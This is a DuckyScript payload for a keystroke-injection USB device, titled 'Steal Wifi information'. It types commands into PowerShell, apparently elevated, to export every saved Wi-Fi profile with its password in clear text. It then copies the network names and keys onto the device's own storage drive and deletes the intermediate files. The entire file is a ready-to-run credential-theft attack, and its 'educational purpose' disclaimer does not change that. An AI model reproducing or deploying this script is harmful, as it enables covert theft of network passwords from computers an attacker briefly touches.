REM # -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
REM #  TITLE: Steal Wifi information
REM #
REM #  AUTHOR: Downiefant
REM #
REM #  Disclaimer: This script is only for Educational purpose. Please don't misuse it.
REM #
REM #  Note: Script won't work on locked devices
REM #
REM #  Date: 18/02/2024
REM # -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
DEFINE PATH D:\

DELAY 1000
ATTACKMODE HID STORAGE
DELAY 2000
INJECT_MOD GUI
DELAY 500
STRING powershell
DELAY 500
RIGHTARROW
DELAY 500
DOWNARROW
DELAY 500
ENTER
DELAY 1000
LEFTARROW
DELAY 100
ENTER
DELAY 500
STRING cd 
STRING PATH
ENTER
DELAY 100
STRING netsh wlan export profile "key=clear"
ENTER
STRING Get-ChildItem 
STRING PATH 
STRING -Filter *.xml | ForEach-Object {Get-Content $_.FullName | Out-File -Append Wifi.txt; Remove-Item $_.FullName}
ENTER
DELAY 3000
STRING (Get-Content "D:\Wifi.txt" | Select-String -Pattern "<name>", "<keyMaterial>") | ForEach-Object { $_.Line } | Out-File -FilePath "D:\WifiShort.txt"
ENTER
DELAY 5000
STRING exit
ENTER
ATTACKMODE HID